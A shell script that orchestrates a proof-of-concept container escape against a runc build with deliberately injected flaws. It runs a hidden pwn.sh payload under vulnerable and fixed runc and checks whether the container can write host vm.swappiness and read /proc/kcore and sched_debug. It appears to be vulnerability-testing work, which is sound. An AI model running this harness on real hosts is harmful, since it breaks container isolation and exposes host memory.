#!/bin/sh
# INJ-A4-maskpaths/run.sh — A4 完整 PoC 一键编排（需 root / 特权容器环境）
#
# 流程：放 pwn.sh 进 rootfs → 用 runc-vuln / runc-fixed 各跑一次容器 →
#       采集容器 stdout + 宿主 swappiness → 复位宿主参数 → 汇总证据
#
# 环境变量：
#   RUNCVULN=/tmp/runc-vuln         含 5 个注入的 runc（先 go build）
#   RUNCFIXED=/tmp/runc-fixed-bin   修复版对照（可选，缺失则跳过差分）
#   ROOTFS=/tmp/rootfs              busybox rootfs（需 sh/od/dd/head）
set -u
BIN_VULN=${RUNCVULN:-/tmp/runc-vuln}
BIN_FIXED=${RUNCFIXED:-/tmp/runc-fixed-bin}
ROOTFS=${ROOTFS:-/tmp/rootfs}
CTR=a4pwn
HERE=$(cd "$(dirname "$0")" && pwd)

[ -x "$BIN_VULN" ]  || { echo "缺 $BIN_VULN —— 先 cd runc && go build -o /tmp/runc-vuln ."; exit 1; }
[ -x "$BIN_FIXED" ] || echo "警告：缺 $BIN_FIXED，跳过差分对照"
[ -d "$ROOTFS/bin" ] || { echo "缺 rootfs $ROOTFS（需含 busybox）"; exit 1; }

# 1. 放 pwn 脚本进 rootfs，搭 bundle
cp "$HERE/pwn.sh" "$ROOTFS/pwn.sh" && chmod +x "$ROOTFS/pwn.sh"
mkdir -p "$HERE/bundle"
cp "$HERE/config.json" "$HERE/bundle/config.json"

SWAP_BEFORE=$(cat /proc/sys/vm/swappiness)
echo ">> 宿主 vm.swappiness 初始值: $SWAP_BEFORE"

# 2. 跑一次容器（$1=binary $2=tag）
run_one() {
    local bin=$1 tag=$2
    [ -x "$bin" ] || return 0
    echo ""
    echo "############ [$tag] ############"
    "$bin" run --bundle "$HERE/bundle" "$CTR-$tag" > "/tmp/a4-out-$tag.txt" 2>&1
    sed -n '1,60p' "/tmp/a4-out-$tag.txt"
    echo "-- 宿主 swappiness after [$tag]: $(cat /proc/sys/vm/swappiness)"
    echo "$SWAP_BEFORE" > /proc/sys/vm/swappiness 2>/dev/null   # 复位宿主参数
    "$bin" delete -f "$CTR-$tag" 2>/dev/null
}

run_one "$BIN_VULN"  vuln
run_one "$BIN_FIXED" fixed

# 3. 证据汇总
echo ""
echo "===== 证据汇总 ====="
echo "-- 宿主 swappiness 最终值: $(cat /proc/sys/vm/swappiness)（应复位为 $SWAP_BEFORE）"
echo "-- rootfs 内 marker: $(cat "$ROOTFS/pwned-a4.txt" 2>/dev/null || echo 无)"
echo ""
echo ">> 解读："
echo "   vuln  : WRITE-OK + kcore/sched_debug 读到真实内容 + marker=A4-PWNED → 掩蔽/只读失效"
echo "   fixed : WRITE-BLOCKED + kcore/sched_debug 为空 + marker=A4-BLOCKED → 保护生效"
